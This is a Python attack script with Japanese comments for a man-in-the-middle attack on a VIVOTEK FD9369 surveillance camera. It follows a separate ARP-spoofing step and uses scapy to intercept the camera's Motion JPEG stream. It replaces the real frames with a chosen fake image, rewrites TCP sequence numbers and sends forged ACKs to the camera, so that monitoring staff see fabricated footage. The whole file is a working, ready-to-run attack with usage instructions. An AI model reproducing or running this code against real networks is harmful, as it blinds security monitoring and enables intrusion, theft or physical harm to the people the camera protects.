#!/usr/bin/env python3
"""
vivotek_attack2_fake.py - 攻撃② 偽画像送信による映像偽装
対象: VIVOTEK FD9369 (Motion JPEG over HTTP)

監視カメラ→PCの通信をリレーする際に、カメラからの映像データを
用意した偽のJPEG画像に差し替えて送信し続ける。

Motion JPEG フォーマット:
  --myboundary\r\n
  Content-Length: [ファイルサイズ]\r\n
  Content-Type: image/jpeg\r\n
  \r\n
  ※JPEGデータのバイナリ※
  \r\n
  (以降繰り返し)

JPEGデータは 1パケット = 1460 byte に収まるようチャンク分割して送信する。

使い方:
  1. arp_spoofing.py を先に起動
  2. fake 画像を用意 (JPEG, できるだけ小さいサイズ推奨)
  3. 本スクリプトを別ターミナルで実行

  python vivotek_attack2_fake.py --camera-mac 08:00:23:9C:31:FF \\
      --monitor-mac D0:BF:9C:E2:25:2D --attacker-mac A0:CE:C8:A4:EB:D5 \\
      --fake-image fake.jpg
"""

import argparse
import sys
from scapy.all import *

TCP.payload_guess = []  # ポート番号による自動解析を無効化

CHUNK_SIZE = 1460  # 1パケットあたりの最大ペイロードサイズ (MTU 1500 - IP/TCPヘッダ)


def load_fake_image(path):
    """偽画像ファイルを読み込み、Motion JPEG 用のバイナリデータを生成する"""
    try:
        with open(path, 'rb') as f:
            image_data = f.read()
    except FileNotFoundError:
        print(f"[!] 画像ファイルが見つかりません: {path}")
        sys.exit(1)

    print(f"[+] 画像ファイル読み込み完了: {path}")
    print(f"    画像サイズ: {len(image_data)} バイト")

    # Motion JPEG フォーマットのヘッダを構築
    boundary_header = (
        b'--myboundary\r\n'
        b'Content-Length: ' + str(len(image_data)).encode() + b'\r\n'
        b'Content-Type: image/jpeg\r\n'
        b'\r\n'
    )

    # ヘッダ + 画像データ + 終端
    full_frame = boundary_header + image_data + b'\r\n'

    # 1460 byte ごとにチャンク分割
    chunks = [full_frame[i:i + CHUNK_SIZE]
              for i in range(0, len(full_frame), CHUNK_SIZE)]

    print(f"    MJPEG フレームサイズ: {len(full_frame)} バイト")
    print(f"    チャンク数: {len(chunks)} ({CHUNK_SIZE} byte/チャンク)")

    return chunks


def main():
    parser = argparse.ArgumentParser(
        description="攻撃② 偽画像送信による映像偽装 (VIVOTEK FD9369)")
    parser.add_argument("--camera-mac", required=True,
                        help="監視カメラの MAC アドレス")
    parser.add_argument("--monitor-mac", required=True,
                        help="監視端末の MAC アドレス")
    parser.add_argument("--attacker-mac", required=True,
                        help="攻撃用 PC の MAC アドレス")
    parser.add_argument("--fake-image", required=True,
                        help="偽装に使う JPEG 画像ファイルのパス")
    parser.add_argument("--iface", default="イーサネット",
                        help="ネットワークインターフェース名 (デフォルト: イーサネット)")
    args = parser.parse_args()

    mac0 = args.attacker_mac.lower()  # 攻撃PC
    mac1 = args.camera_mac.lower()    # 監視カメラ
    mac2 = args.monitor_mac.lower()   # 監視PC
    IF = args.iface

    # 偽画像の読み込みとチャンク分割
    chunks = load_fake_image(args.fake_image)

    FILT = "tcp port 80 and ether dst " + mac0

    # TCPシーケンス番号を追跡するための変数
    tcpseq_state = {"seq": 0, "dport": 0}
    # JPEGフレーム内かどうかを追跡するフラグ
    state = {"in_jpeg": False}

    def maeta(frame):
        if frame[Ether].src.lower() == mac1:
            # カメラ → 監視PC の通信を横取り

            if frame.getlayer(TCP) and frame.getlayer(Raw):
                if frame[TCP].sport == 80:
                    payload = frame[Raw].load

                    # カメラが送ってきた元データのサイズを記録 (ACK用)
                    original_payload_len = len(payload)
                    original_seq = frame[TCP].seq

                    # JPEGフレーム開始 (0xFFD8) を検出
                    if b'\xff\xd8' in payload:
                        state["in_jpeg"] = True

                        # 初回: 監視PCの宛先ポートを記録
                        if tcpseq_state["dport"] == 0:
                            tcpseq_state["dport"] = frame[TCP].dport
                            tcpseq_state["seq"] = frame[TCP].seq

                        # ペイロードを偽画像の MJPEG boundary ヘッダに差し替え
                        frame[Raw].load = b'--myboundary\r\n'
                        frame[TCP].seq = tcpseq_state["seq"]
                        frame[Ether].src = mac0
                        frame[Ether].dst = mac2
                        frame[IP].chksum = None
                        frame[IP].len = None
                        frame[TCP].chksum = None
                        frame.show()
                        sendp(frame, iface=IF)
                        tcpseq_state["seq"] += len(b'--myboundary\r\n')

                        # 偽画像データをチャンク単位で送信
                        for i, chunk in enumerate(chunks):
                            print(f"チャンク {i + 1} を送信中, サイズ: {len(chunk)} バイト")
                            frame[Raw].load = chunk
                            frame[TCP].seq = tcpseq_state["seq"]
                            frame[Ether].src = mac0
                            frame[Ether].dst = mac2
                            frame[IP].chksum = None
                            frame[IP].len = None
                            frame[TCP].chksum = None
                            frame.show()
                            sendp(frame, iface=IF)
                            tcpseq_state["seq"] += len(chunk)

                    elif state["in_jpeg"]:
                        # JPEGフレームの継続パケット (0xFFD8なし)
                        # → 元データは監視PCへ転送しない (ドロップ)
                        pass

                    else:
                        # JPEG以外 (HTTPヘッダ等) はそのまま転送
                        frame[Ether].dst = mac2
                        frame[Ether].src = mac0
                        sendp(frame, iface=IF)
                        return

                    # JPEGフレーム終了 (0xFFD9) を検出 → フラグOFF
                    if b'\xff\xd9' in payload:
                        state["in_jpeg"] = False

                    # カメラへ合成ACKを返送 (再送防止)
                    ack_pkt = (
                        Ether(src=mac0, dst=mac1)
                        / IP(src=frame[IP].dst, dst=frame[IP].src)
                        / TCP(sport=frame[TCP].dport,
                              dport=80,
                              flags="A",
                              seq=frame[TCP].ack,
                              ack=original_seq + original_payload_len)
                    )
                    ack_pkt[IP].chksum = None
                    ack_pkt[TCP].chksum = None
                    sendp(ack_pkt, iface=IF, verbose=False)

                    return  # 元のフレームは転送しない

            # TCP制御パケット (SYN/ACK等) はそのまま転送
            frame[Ether].dst = mac2

        elif frame[Ether].src.lower() == mac2:
            # 監視PC → カメラ: そのまま転送
            frame[Ether].dst = mac1
        else:
            return

        frame[Ether].src = mac0
        sendp(frame, iface=IF)

    print("=" * 55)
    print("  攻撃② 偽画像送信による映像偽装")
    print("  対象: VIVOTEK FD9369 (Motion JPEG)")
    print("=" * 55)
    print(f"  カメラ   MAC : {mac1}")
    print(f"  監視PC   MAC : {mac2}")
    print(f"  攻撃PC   MAC : {mac0}")
    print(f"  偽画像        : {args.fake_image}")
    print(f"  チャンクサイズ : {CHUNK_SIZE} byte")
    print(f"  フィルタ      : {FILT}")
    print("=" * 55)
    print("[*] パケット中継開始... (Ctrl+C で終了)")
    print()

    conf.verb = False
    sniff(iface=IF, filter=FILT, store=0, prn=maeta)


if __name__ == "__main__":
    main()
